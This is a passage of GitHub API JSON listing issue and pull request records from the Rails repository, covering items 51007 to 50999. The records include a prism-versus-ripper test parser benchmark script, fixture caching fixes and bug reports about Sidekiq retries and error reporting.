        "body": "Deprecate config.active_record.warn_on_records_fetched_greater_than setting in favor of #50887.\r\n\r\nThe same functionality (and more) can now be achieved by subscribing to sql.active_record notifications:\r\n\r\n![image](https://github.com/rails/rails/assets/91577/b6501bca-405c-417c-864d-b016b2db0abc)\r\n\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51007/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51007/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51006",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51006/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51006/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51006/events",
        "html_url": "https://github.com/rails/rails/pull/51006",
        "id": 2124354975,
        "node_id": "PR_kwDNIULOZlUjpA",
        "number": 51006,
        "title": "Parse tests with prism",
        "user": {
            "login": "kddnewton",
            "id": 5093358,
            "node_id": "MDQ6VXNlcjUwOTMzNTg=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5093358?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/kddnewton",
            "html_url": "https://github.com/kddnewton",
            "followers_url": "https://api.github.com/users/kddnewton/followers",
            "following_url": "https://api.github.com/users/kddnewton/following{/other_user}",
            "gists_url": "https://api.github.com/users/kddnewton/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/kddnewton/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/kddnewton/subscriptions",
            "organizations_url": "https://api.github.com/users/kddnewton/orgs",
            "repos_url": "https://api.github.com/users/kddnewton/repos",
            "events_url": "https://api.github.com/users/kddnewton/events{/privacy}",
            "received_events_url": "https://api.github.com/users/kddnewton/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-08T04:50:36Z",
        "updated_at": "2024-02-09T21:43:59Z",
        "closed_at": "2024-02-09T21:43:23Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51006",
            "html_url": "https://github.com/rails/rails/pull/51006",
            "diff_url": "https://github.com/rails/rails/pull/51006.diff",
            "patch_url": "https://github.com/rails/rails/pull/51006.patch",
            "merged_at": "2024-02-09T21:43:23Z"
        },
        "body": "### Motivation / Background\r\n\r\nThis is a refactor PR to change TestParser to parse using the prism parser if it is available instead of the ripper library.\r\n\r\n### Detail\r\n\r\nPrism provides a simpler interface with consistent field names, so it should be easier to maintain going forward. It also has a guaranteed stable API, as opposed to ripper which can change between patch versions of Ruby. It also results in less code.\r\n\r\n### Additional information\r\n\r\nI benchmarked this change, and it appears to have no visible difference (it's within the margin of error). My benchmark script is below.\r\n\r\n<details>\r\n<summary>Benchmark</summary>\r\n\r\n```ruby\r\n# frozen_string_literal: true\r\n\r\nrequire \"active_support/test_case\"\r\nrequire \"prism\"\r\nrequire \"ripper\"\r\nrequire \"benchmark/ips\"\r\n\r\nclass PrismParser\r\n  def self.definition_for(method)\r\n    filepath, start_line = method.source_location\r\n    queue = [Prism.parse_file(filepath).value]\r\n\r\n    while (node = queue.shift)\r\n      case node.type\r\n      when :def_node\r\n        if node.name.start_with?(\"test\") && node.location.start_line == start_line\r\n          return [filepath, start_line..node.location.end_line]\r\n        end\r\n      when :call_node\r\n        if node.name == :test && node.location.start_line == start_line\r\n          return [filepath, start_line..node.location.end_line]\r\n        end\r\n      end\r\n\r\n      queue.concat(node.compact_child_nodes)\r\n    end\r\n\r\n    nil\r\n  end\r\nend\r\n\r\nclass RipperParser < Ripper\r\n  def self.definition_for(method_obj)\r\n    path, begin_line = method_obj.source_location\r\n    begins_to_ends = new(File.read(path), path).parse\r\n    return unless end_line = begins_to_ends[begin_line]\r\n    [path, (begin_line..end_line)]\r\n  end\r\n\r\n  def initialize(*)\r\n    # A hash mapping the 1-indexed line numbers that tests start on to where they end.\r\n    @begins_to_ends = {}\r\n    super\r\n  end\r\n\r\n  def parse\r\n    super\r\n    @begins_to_ends\r\n  end\r\n\r\n  def on_def(begin_line, *)\r\n    @begins_to_ends[begin_line] = lineno\r\n  end\r\n\r\n  def on_method_add_block(begin_line, end_line)\r\n    if begin_line && end_line\r\n      @begins_to_ends[begin_line] = end_line\r\n    end\r\n  end\r\n\r\n  def on_command_call(*, begin_lineno, _args)\r\n    begin_lineno\r\n  end\r\n\r\n  def first_arg(arg, *)\r\n    arg\r\n  end\r\n\r\n  def just_lineno(*)\r\n    lineno\r\n  end\r\n\r\n  alias on_method_add_arg first_arg\r\n  alias on_command first_arg\r\n  alias on_stmts_add first_arg\r\n  alias on_arg_paren first_arg\r\n  alias on_bodystmt first_arg\r\n\r\n  alias on_ident just_lineno\r\n  alias on_do_block just_lineno\r\n  alias on_stmts_new just_lineno\r\n  alias on_brace_block just_lineno\r\n\r\n  def on_args_new\r\n    []\r\n  end\r\n\r\n  def on_args_add(parts, part)\r\n    parts << part\r\n  end\r\n\r\n  def on_args_add_block(args, *rest)\r\n    args.first\r\n  end\r\nend\r\n\r\nclass ExampleTest < ActiveSupport::TestCase\r\n  def test_method\r\n    assert true\r\n\r\n\r\n  end\r\n\r\n  def test_oneline; assert true; end\r\n\r\n  test \"declarative\" do\r\n    assert true\r\n  end\r\n\r\n  test(\"declarative w/parens\") do\r\n    assert true\r\n\r\n  end\r\n\r\n  self.test \"declarative explicit receiver\" do\r\n    assert true\r\n  end\r\n\r\n  test(\"declarative oneline\") { assert true }\r\n\r\n  test(\"declarative oneline do\") do assert true end\r\n\r\n  test(\"declarative multiline w/ braces\") {\r\n    assert true\r\n    refute false\r\n  }\r\nend\r\n\r\nmethods = ExampleTest.instance_methods.grep(/^test_/).map { |method| ExampleTest.instance_method(method) }\r\n\r\nBenchmark.ips do |x|\r\n  x.report(\"Prism\") { methods.each { |method| PrismParser.definition_for(method) } }\r\n  x.report(\"Ripper\") { methods.each { |method| RipperParser.definition_for(method) } }\r\n  x.compare!\r\nend\r\n```\r\n\r\n</details>\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51006/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51006/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51005",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51005/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51005/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51005/events",
        "html_url": "https://github.com/rails/rails/pull/51005",
        "id": 2124173440,
        "node_id": "PR_kwDNIULOZlK2Mg",
        "number": 51005,
        "title": "Rails test command suggests similar test files when the given file is not found",
        "user": {
            "login": "zzak",
            "id": 277819,
            "node_id": "MDQ6VXNlcjI3NzgxOQ==",
            "avatar_url": "https://avatars.githubusercontent.com/u/277819?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/zzak",
            "html_url": "https://github.com/zzak",
            "followers_url": "https://api.github.com/users/zzak/followers",
            "following_url": "https://api.github.com/users/zzak/following{/other_user}",
            "gists_url": "https://api.github.com/users/zzak/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/zzak/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/zzak/subscriptions",
            "organizations_url": "https://api.github.com/users/zzak/orgs",
            "repos_url": "https://api.github.com/users/zzak/repos",
            "events_url": "https://api.github.com/users/zzak/events{/privacy}",
            "received_events_url": "https://api.github.com/users/zzak/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-08T00:58:58Z",
        "updated_at": "2024-02-13T23:09:35Z",
        "closed_at": null,
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51005",
            "html_url": "https://github.com/rails/rails/pull/51005",
            "diff_url": "https://github.com/rails/rails/pull/51005.diff",
            "patch_url": "https://github.com/rails/rails/pull/51005.patch",
            "merged_at": null
        },
        "body": "For example, if you run `rails test test/models/usr_tsst.rb` and the file does not exist, Rails will suggest `test/models/users_test.rb` as a possible file.\r\n\r\n```\r\nCould not load test file: test/models/usr_tsst.rb. Did you mean? test/models/user_test.rb\r\n```\r\n\r\nAfter investigating #50978, I was inspired to add this feature to Rails.\r\n\r\nCredit to @tenderlove for the minitest implementation.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51005/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51005/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51004",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51004/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51004/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51004/events",
        "html_url": "https://github.com/rails/rails/pull/51004",
        "id": 2123723416,
        "node_id": "PR_kwDNIULOZkyIOQ",
        "number": 51004,
        "title": "[RF DOCS] Add documentation for `perform_all_later` to Active Job Basics guide [ci-skip]",
        "user": {
            "login": "bhumi1102",
            "id": 1966473,
            "node_id": "MDQ6VXNlcjE5NjY0NzM=",
            "avatar_url": "https://avatars.githubusercontent.com/u/1966473?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/bhumi1102",
            "html_url": "https://github.com/bhumi1102",
            "followers_url": "https://api.github.com/users/bhumi1102/followers",
            "following_url": "https://api.github.com/users/bhumi1102/following{/other_user}",
            "gists_url": "https://api.github.com/users/bhumi1102/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/bhumi1102/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/bhumi1102/subscriptions",
            "organizations_url": "https://api.github.com/users/bhumi1102/orgs",
            "repos_url": "https://api.github.com/users/bhumi1102/repos",
            "events_url": "https://api.github.com/users/bhumi1102/events{/privacy}",
            "received_events_url": "https://api.github.com/users/bhumi1102/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            },
            {
                "id": 6434393529,
                "node_id": "LA_kwDNIULPAAAAAX-FDbk",
                "url": "https://api.github.com/repos/rails/rails/labels/rails%20foundation",
                "name": "rails foundation",
                "color": "e99695",
                "default": false,
                "description": "Rails Foundation PRs"
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-07T19:27:15Z",
        "updated_at": "2024-02-19T16:56:15Z",
        "closed_at": "2024-02-19T16:56:15Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51004",
            "html_url": "https://github.com/rails/rails/pull/51004",
            "diff_url": "https://github.com/rails/rails/pull/51004.diff",
            "patch_url": "https://github.com/rails/rails/pull/51004.patch",
            "merged_at": "2024-02-19T16:56:15Z"
        },
        "body": "## Overview\r\n\r\nAdd documentation related to `perform_all_later` for bulk enqueuing jobs.\r\n\r\n## Testing\r\n\r\nTested the new method in-app using sidekiq locally. Also tested documentation by running `guides:generate`, `guides:validate` and `guides:lint` locally.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51004/reactions",
            "total_count": 7,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 7,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51004/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51003",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51003/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51003/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51003/events",
        "html_url": "https://github.com/rails/rails/issues/51003",
        "id": 2123544425,
        "node_id": "I_kwDNIULOfpK3aQ",
        "number": 51003,
        "title": "Sidekiq ActiveJob adapter resets provider_job_id on with retry_job",
        "user": {
            "login": "nhorton",
            "id": 204146,
            "node_id": "MDQ6VXNlcjIwNDE0Ng==",
            "avatar_url": "https://avatars.githubusercontent.com/u/204146?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/nhorton",
            "html_url": "https://github.com/nhorton",
            "followers_url": "https://api.github.com/users/nhorton/followers",
            "following_url": "https://api.github.com/users/nhorton/following{/other_user}",
            "gists_url": "https://api.github.com/users/nhorton/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/nhorton/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/nhorton/subscriptions",
            "organizations_url": "https://api.github.com/users/nhorton/orgs",
            "repos_url": "https://api.github.com/users/nhorton/repos",
            "events_url": "https://api.github.com/users/nhorton/events{/privacy}",
            "received_events_url": "https://api.github.com/users/nhorton/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2024-02-07T17:38:09Z",
        "updated_at": "2024-02-09T00:26:41Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "### Issue\r\nThe `retry_job` method on ActiveJob jobs is basically a wrapper for `enqueue`. Enqueue for Sidekiq just calls the factory for wrapping the ActiveJob job in a Sidekiq JobWrapper. (See\r\nhttps://github.com/rails/rails/blob/babad404a9ae563fff7aa624859845772a4de4b6/activejob/lib/active_job/queue_adapters/sidekiq_adapter.rb#L22).\r\n\r\nThe issue is that when that happens, it is effectively a completely new Sidekiq job. Several of the attributes of the originating ActiveJob instance get passed into a `set` on that Sidekiq job, but the provider_job_id is not one of them.\r\n\r\n### Expected behavior\r\n`retry_job` should result in the job having the same `provider_job_id` as it did before the retry.\r\n\r\n### Actual behavior\r\n'retry_job' results in a change to the `provider_job_id` every time.\r\n\r\n### System configuration\r\n**Rails version**:\r\n7.1.2\r\n\r\n**Ruby version**:\r\n3.2.2\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51003/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51003/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51002",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51002/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51002/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51002/events",
        "html_url": "https://github.com/rails/rails/issues/51002",
        "id": 2123429520,
        "node_id": "I_kwDNIULOfpD2kA",
        "number": 51002,
        "title": "Rails error reporter doesn't report exceptions in production",
        "user": {
            "login": "fractaledmind",
            "id": 5077225,
            "node_id": "MDQ6VXNlcjUwNzcyMjU=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5077225?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/fractaledmind",
            "html_url": "https://github.com/fractaledmind",
            "followers_url": "https://api.github.com/users/fractaledmind/followers",
            "following_url": "https://api.github.com/users/fractaledmind/following{/other_user}",
            "gists_url": "https://api.github.com/users/fractaledmind/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/fractaledmind/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/fractaledmind/subscriptions",
            "organizations_url": "https://api.github.com/users/fractaledmind/orgs",
            "repos_url": "https://api.github.com/users/fractaledmind/repos",
            "events_url": "https://api.github.com/users/fractaledmind/events{/privacy}",
            "received_events_url": "https://api.github.com/users/fractaledmind/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": {
            "login": "byroot",
            "id": 44640,
            "node_id": "MDQ6VXNlcjQ0NjQw",
            "avatar_url": "https://avatars.githubusercontent.com/u/44640?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/byroot",
            "html_url": "https://github.com/byroot",
            "followers_url": "https://api.github.com/users/byroot/followers",
            "following_url": "https://api.github.com/users/byroot/following{/other_user}",
            "gists_url": "https://api.github.com/users/byroot/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/byroot/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/byroot/subscriptions",
            "organizations_url": "https://api.github.com/users/byroot/orgs",
            "repos_url": "https://api.github.com/users/byroot/repos",
            "events_url": "https://api.github.com/users/byroot/events{/privacy}",
            "received_events_url": "https://api.github.com/users/byroot/received_events",
            "type": "User",
            "site_admin": false
        },
        "assignees": [
            {
                "login": "byroot",
                "id": 44640,
                "node_id": "MDQ6VXNlcjQ0NjQw",
                "avatar_url": "https://avatars.githubusercontent.com/u/44640?v=4",
                "gravatar_id": "",
                "url": "https://api.github.com/users/byroot",
                "html_url": "https://github.com/byroot",
                "followers_url": "https://api.github.com/users/byroot/followers",
                "following_url": "https://api.github.com/users/byroot/following{/other_user}",
                "gists_url": "https://api.github.com/users/byroot/gists{/gist_id}",
                "starred_url": "https://api.github.com/users/byroot/starred{/owner}{/repo}",
                "subscriptions_url": "https://api.github.com/users/byroot/subscriptions",
                "organizations_url": "https://api.github.com/users/byroot/orgs",
                "repos_url": "https://api.github.com/users/byroot/repos",
                "events_url": "https://api.github.com/users/byroot/events{/privacy}",
                "received_events_url": "https://api.github.com/users/byroot/received_events",
                "type": "User",
                "site_admin": false
            }
        ],
        "milestone": null,
        "comments": 5,
        "created_at": "2024-02-07T16:32:54Z",
        "updated_at": "2024-02-12T16:51:03Z",
        "closed_at": "2024-02-12T16:51:03Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "In production, an exception that occurs in the HTTP request lifecycle is _rendered_ and _not raised_. The `Executor` middleware reports [only _raised_ exceptions](https://github.com/rails/rails/blob/main/actionpack/lib/action_dispatch/middleware/executor.rb#L16-L19). This severely neuters, IMHO, the value of the new error reporter.\r\n\r\n### Expected behavior\r\nExceptions that occur within the HTTP request lifecycle in production, while still being _rendered_, are also reported to the error reporter.\r\n\r\n### Actual behavior\r\nExceptions that occur within the HTTP request lifecycle in production are not reported to the error reporter.\r\n\r\n### System configuration\r\n**Rails version**: >7.0\r\n\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51002/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51002/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51001",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51001/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51001/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51001/events",
        "html_url": "https://github.com/rails/rails/pull/51001",
        "id": 2123357599,
        "node_id": "PR_kwDNIULOZkeTXg",
        "number": 51001,
        "title": "Share already loaded fixtures across test classes",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-07T15:59:16Z",
        "updated_at": "2024-02-07T18:11:08Z",
        "closed_at": "2024-02-07T18:10:38Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51001",
            "html_url": "https://github.com/rails/rails/pull/51001",
            "diff_url": "https://github.com/rails/rails/pull/51001.diff",
            "patch_url": "https://github.com/rails/rails/pull/51001.patch",
            "merged_at": "2024-02-07T18:10:38Z"
        },
        "body": "`self.class` is a fairly narrow cache key, so it doesn't hit that much, but more importantly, since nothing clears that cache, on large test suites it keeps growing extremely large.\r\n\r\n~~Using the list of fixtures as a cache key doesn't strictly solve the growth issue, but most classes actually load all fixtures so this should shrink the cache size considerably.~~\r\n\r\nInstead we can use the parameters of `load_fixtures` as a cache key, and clear the entire cache when changes, this both improve the hit rate and solves a memory leak.\r\n\r\ncc @ChrisBr ",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51001/reactions",
            "total_count": 3,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 3,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51001/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51000",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51000/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51000/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51000/events",
        "html_url": "https://github.com/rails/rails/pull/51000",
        "id": 2123245523,
        "node_id": "PR_kwDNIULOZkYMnQ",
        "number": 51000,
        "title": "Fix a race condition in FutureResult#instrument",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-07T15:07:47Z",
        "updated_at": "2024-02-07T16:38:35Z",
        "closed_at": "2024-02-07T16:38:35Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51000",
            "html_url": "https://github.com/rails/rails/pull/51000",
            "diff_url": "https://github.com/rails/rails/pull/51000.diff",
            "patch_url": "https://github.com/rails/rails/pull/51000.patch",
            "merged_at": "2024-02-07T16:38:35Z"
        },
        "body": "We must wait until the event is fully recorded before adding it to the list, otherwise it might be flushed while incomplete.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51000/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51000/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50999",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50999/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50999/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50999/events",
        "html_url": "https://github.com/rails/rails/pull/50999",
        "id": 2122857666,
        "node_id": "PR_kwDNIULOZkDE_A",
        "number": 50999,
        "title": "Decouple transactional fixtures and active connections",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            },
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 5,
        "created_at": "2024-02-07T11:51:30Z",
        "updated_at": "2024-02-12T08:54:49Z",
        "closed_at": "2024-02-12T08:54:39Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50999",
            "html_url": "https://github.com/rails/rails/pull/50999",
